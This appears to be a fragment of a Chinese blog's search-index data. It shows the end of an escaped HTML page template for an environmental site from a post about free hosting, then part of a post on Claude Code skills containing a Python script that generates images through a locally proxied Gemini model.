class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;#get-involved\u0026#34;\u003c/span\u003e\u0026gt;Get Involved\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;li\u0026gt;\u0026lt;a \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;#contact\u0026#34;\u003c/span\u003e\u0026gt;Contact\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;/ul\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;footer-column\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;h3\u0026gt;Our Programs\u0026lt;/h3\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;ul \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;footer-links\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;li\u0026gt;\u0026lt;a \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;#\u0026#34;\u003c/span\u003e\u0026gt;Reforestation\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;li\u0026gt;\u0026lt;a \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;#\u0026#34;\u003c/span\u003e\u0026gt;Ocean Cleanup\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;li\u0026gt;\u0026lt;a \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;#\u0026#34;\u003c/span\u003e\u0026gt;Wildlife Protection\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;li\u0026gt;\u0026lt;a \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;#\u0026#34;\u003c/span\u003e\u0026gt;Climate Education\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;li\u0026gt;\u0026lt;a \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;#\u0026#34;\u003c/span\u003e\u0026gt;Sustainable Agriculture\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;/ul\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;footer-column\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;h3\u0026gt;Contact Us\u0026lt;/h3\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;p\u0026gt;Copper Creek Drive, New York\u0026lt;/p\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;p\u0026gt;+1 \u003cspan class=\"o\"\u003e(\u003c/span\u003e312\u003cspan class=\"o\"\u003e)\u003c/span\u003e 171-0771\u0026lt;/p\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;p\u0026gt;support@greennetwork.org\u0026lt;/p\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;copyright\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;p\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003ecopy\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"m\"\u003e2025\u003c/span\u003e Green Network. All rights reserved.\u0026lt;/p\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;/footer\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;script\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        // Mobile Menu Toggle\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        document.querySelector\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;.mobile-menu\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e.addEventListener\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;click\u0026#39;\u003c/span\u003e, \u003cspan class=\"k\"\u003efunction\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            document.querySelector\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;nav ul\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e.classList.toggle\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;active\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        // Counter Animation\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003efunction\u003c/span\u003e animateCounters\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            const \u003cspan class=\"nv\"\u003ecounters\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e document.querySelectorAll\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;.counter\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            const \u003cspan class=\"nv\"\u003espeed\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 200\u003cspan class=\"p\"\u003e;\u003c/span\u003e // The lower the slower\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            counters.forEach\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003ecounter\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                const \u003cspan class=\"nv\"\u003etarget\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e +counter.getAttribute\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;data-target\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                const \u003cspan class=\"nv\"\u003ecount\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e +counter.innerText\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                const \u003cspan class=\"nv\"\u003einc\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e target / speed\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003ecount \u0026lt; target\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    counter.innerText \u003cspan class=\"o\"\u003e=\u003c/span\u003e Math.ceil\u003cspan class=\"o\"\u003e(\u003c/span\u003ecount + inc\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    setTimeout\u003cspan class=\"o\"\u003e(\u003c/span\u003eanimateCounters, 1\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    counter.innerText \u003cspan class=\"o\"\u003e=\u003c/span\u003e target\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        // Initialize counters when page loads\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        window.addEventListener\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;load\u0026#39;\u003c/span\u003e, animateCounters\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        // Smooth scrolling \u003cspan class=\"k\"\u003efor\u003c/span\u003e navigation links\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        document.querySelectorAll\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;a[href^=\u0026#34;#\u0026#34;]\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e.forEach\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eanchor\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            anchor.addEventListener\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;click\u0026#39;\u003c/span\u003e, \u003cspan class=\"k\"\u003efunction\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003ee\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                e.preventDefault\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                const \u003cspan class=\"nv\"\u003etargetId\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e this.getAttribute\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;href\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003etargetId\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;#\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                const \u003cspan class=\"nv\"\u003etargetElement\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e document.querySelector\u003cspan class=\"o\"\u003e(\u003c/span\u003etargetId\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003etargetElement\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    window.scrollTo\u003cspan class=\"o\"\u003e({\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        top: targetElement.offsetTop - 80,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        behavior: \u003cspan class=\"s1\"\u003e\u0026#39;smooth\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    document.querySelector\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;nav ul\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e.classList.remove\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;active\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;/script\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/body\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/html\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003epackage.json 文件，index.js 运行时需要依赖的安装包文件，安装了2个包，axios和ws\u003c/p\u003e","title":"wispbyte.com薅羊毛记"},{"content":"最近天天都在学习claude code，Skills == 工具箱（技能库）\n我们可以把skills看成是一个个的小程序，这些程序有入口，有参数，有限制。\n那通过一篇md文件，来引导claude来智能的传参调用你的程序，这样技能箱就越来越丰富。\n一、我们首先准备这个可执行 python 脚本 这个是通过CLIProxyAPI的反代，把antigravity的gemini3模型给抽出来，然后生图\n看最下面，有一堆参数\n#!/usr/bin/env python3 # ============================================================ # Configuration - Edit these values before use # 配置项 - 使用前请修改以下值 # ============================================================ API_BASE_URL = \u0026#34;http://127.0.0.1:8317\u0026#34; # API server address / API 服务器地址 API_KEY = \u0026#34;key\u0026#34; # Your API key / 你的 API 密钥 MODEL = \u0026#34;gemini-3-pro-image-preview\u0026#34; # Model name / 模型名称 # ============================================================ import argparse import base64 import json import os import sys from datetime import datetime from pathlib import Path from urllib import request from mimetypes import guess_type try: from google import genai from google.genai import types except ImportError: genai = None types = None VALID_ASPECT_RATIOS = [\u0026#34;1:1\u0026#34;, \u0026#34;2:3\u0026#34;, \u0026#34;3:2\u0026#34;, \u0026#34;3:4\u0026#34;, \u0026#34;4:3\u0026#34;, \u0026#34;4:5\u0026#34;, \u0026#34;5:4\u0026#34;, \u0026#34;9:16\u0026#34;, \u0026#34;16:9\u0026#34;, \u0026#34;21:9\u0026#34;] VALID_RESOLUTIONS = [\u0026#34;1K\u0026#34;, \u0026#34;2K\u0026#34;, \u0026#34;4K\u0026#34;] def _resolve_output_dir(output_dir: str, mkdir: bool) -\u0026gt; str: if os.path.isdir(output_dir): return output_dir if mkdir: os.makedirs(output_dir, exist_ok=True) return output_dir print(f\u0026#34;Warning: Output directory not found: {output_dir}. Saving to current directory.\u0026#34;) return \u0026#34;.\u0026#34; def _build_filename(output_name: str | None, timestamp: str, index: int, default_ext: str) -\u0026gt; str: if output_name: root, ext = os.path.splitext(output_name) if not ext: ext = default_ext suffix = f\u0026#34;_{index}\u0026#34; if index \u0026gt; 0 else \u0026#34;\u0026#34; return f\u0026#34;{root}{suffix}{ext}\u0026#34; return f\u0026#34;generated_{timestamp}_{index}{default_ext}\u0026#34; def _load_image_inline(image_path: str) -\u0026gt; dict: mime_type, _ = guess_type(image_path) if mime_type is None: mime_type = \u0026#34;image/png\u0026#34; data = Path(image_path).read_bytes() return {\u0026#34;inlineData\u0026#34;: {\u0026#34;mimeType\u0026#34;: mime_type, \u0026#34;data\u0026#34;: base64.b64encode(data).decode(\u0026#34;ascii\u0026#34;)}} def _post_json(url: str, body: dict) -\u0026gt; dict: data = json.dumps(body).encode(\u0026#34;utf-8\u0026#34;) req = request.Request( url, data=data, headers={\u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;x-goog-api-key\u0026#34;: API_KEY}, ) resp = request.urlopen(req).read() return json.loads(resp) def _save_images(parts, output_dir: str, select: str, output_name: str | None, mkdir: bool) -\u0026gt; list[str]: imgs = [p[\u0026#34;inlineData\u0026#34;] for p in parts if \u0026#34;inlineData\u0026#34; in p] if not imgs: return [] if select == \u0026#34;first\u0026#34;: imgs = imgs[:1] elif select == \u0026#34;last\u0026#34;: imgs = imgs[-1:] elif select == \u0026#34;max_res\u0026#34;: imgs = imgs[-1:] ts = datetime.now().strftime(\u0026#34;%Y%m%d_%H%M%S\u0026#34;) output_dir = _resolve_output_dir(output_dir, mkdir) saved = [] for i, img in enumerate(imgs): data = base64.b64decode(img[\u0026#34;data\u0026#34;]) ext = \u0026#34;jpg\u0026#34; if img.get(\u0026#34;mimeType\u0026#34;, \u0026#34;\u0026#34;).endswith(\u0026#34;jpeg\u0026#34;) else \u0026#34;png\u0026#34; filename = _build_filename(output_name, ts, i, f\u0026#34;.{ext}\u0026#34;) path = Path(output_dir) / filename path.write_bytes(data) saved.append(str(path)) return saved def _sdk_generate(prompt: str, output_dir: str, aspect_ratio: str, resolution: str, input_image: str | None, output_name: str | None, mkdir: bool, select: str) -\u0026gt; list[str]: if genai is None or types is None: print(\u0026#34;Error: google-genai is not installed.\u0026#34;) return [] client_kwargs = {\u0026#34;api_key\u0026#34;: API_KEY} if API_BASE_URL: client_kwargs[\u0026#34;http_options\u0026#34;] = {\u0026#34;base_url\u0026#34;: API_BASE_URL} client = genai.Client(**client_kwargs) if input_image: if not Path(input_image).exists(): print(f\u0026#34;Error: Input image not found: {input_image}\u0026#34;) return [] with open(input_image, \u0026#34;rb\u0026#34;) as f: image_bytes = f.read() mime_type, _ = guess_type(input_image) if mime_type is None: mime_type = \u0026#34;image/png\u0026#34; image_part = types.Part.from_bytes(data=image_bytes, mime_type=mime_type) contents = [prompt, image_part] else: contents = prompt try: response = client.models.generate_content( model=MODEL, contents=contents, config=types.GenerateContentConfig( image_config=types.ImageConfig( aspectRatio=aspect_ratio, imageSize=resolution, ) ), ) except Exception as exc: print(f\u0026#34;API Error: {exc}\u0026#34;) return [] saved = [] ts = datetime.now().strftime(\u0026#34;%Y%m%d_%H%M%S\u0026#34;) output_dir = _resolve_output_dir(output_dir, mkdir) image_parts = [] for part in response.parts: if part.text is not None: print(f\u0026#34;Response text: {part.text}\u0026#34;) elif image := part.as_image(): image_parts.append(image) if not image_parts: return [] if select == \u0026#34;first\u0026#34;: image_parts = image_parts[:1] elif select == \u0026#34;last\u0026#34;: image_parts = image_parts[-1:] elif select == \u0026#34;max_res\u0026#34;: image_parts = [max(image_parts, key=lambda x: len(x.image_bytes))] for i, image in enumerate(image_parts): filename = _build_filename(output_name, ts, i, \u0026#34;.png\u0026#34;) path = Path(output_dir) / filename image.save(path) saved.append(str(path)) return saved def _http_generate(prompt: str, output_dir: str, aspect_ratio: str, resolution: str, input_image: str | None, select: str, output_name: str | None, mkdir: bool) -\u0026gt; list[str]: if input_image and not Path(input_image).exists(): print(f\u0026#34;Error: Input image not found: {input_image}\u0026#34;) return [] url = f\u0026#34;{API_BASE_URL.rstrip(\u0026#39;/\u0026#39;)}/v1beta/models/{MODEL}:generateContent\u0026#34; parts = [{\u0026#34;text\u0026#34;: prompt}] if input_image: parts.append(_load_image_inline(input_image)) body = { \u0026#34;contents\u0026#34;: [{\u0026#34;parts\u0026#34;: parts}], \u0026#34;generationConfig\u0026#34;: { \u0026#34;responseModalities\u0026#34;: [\u0026#34;TEXT\u0026#34;, \u0026#34;IMAGE\u0026#34;], \u0026#34;imageConfig\u0026#34;: {\u0026#34;aspectRatio\u0026#34;: aspect_ratio, \u0026#34;imageSize\u0026#34;: resolution}, }, } try: resp = _post_json(url, body) except Exception as exc: print(f\u0026#34;API Error: {exc}\u0026#34;) return [] if \u0026#34;candidates\u0026#34; not in resp: print(f\u0026#34;Unexpected response: {resp}\u0026#34;) return [] parts_out = resp[\u0026#34;candidates\u0026#34;][0][\u0026#34;content\u0026#34;][\u0026#34;parts\u0026#34;] return _save_images(parts_out, output_dir, select, output_name, mkdir) def main(): parser = argparse.ArgumentParser(description=\u0026#34;Generate images via SDK or HTTP\u0026#34;) parser.add_argument(\u0026#34;prompt\u0026#34;, nargs=\u0026#34;*\u0026#34;, help=\u0026#34;Image description prompt\u0026#34;) parser.add_argument(\u0026#34;--mode\u0026#34;, default=\u0026#34;sdk\u0026#34;, choices=[\u0026#34;sdk\u0026#34;, \u0026#34;http\u0026#34;]) parser.add_argument(\u0026#34;--aspect-ratio\u0026#34;, \u0026#34;-a\u0026#34;, default=\u0026#34;16:9\u0026#34;, choices=VALID_ASPECT_RATIOS) parser.add_argument(\u0026#34;--resolution\u0026#34;, \u0026#34;-r\u0026#34;, default=\u0026#34;4K\u0026#34;, choices=VALID_RESOLUTIONS) parser.add_argument(\u0026#34;--output-dir\u0026#34;, \u0026#34;-o\u0026#34;, default=\u0026#34;.\u0026#34;) parser.add_argument(\u0026#34;--output-name\u0026#34;, default=None) parser.add_argument(\u0026#34;--mkdir\u0026#34;, action=\u0026#34;store_true\u0026#34;) parser.add_argument(\u0026#34;--input-image\u0026#34;, \u0026#34;-i\u0026#34;, default=None) parser.add_argument(\u0026#34;--select\u0026#34;, default=\u0026#34;all\u0026#34;, 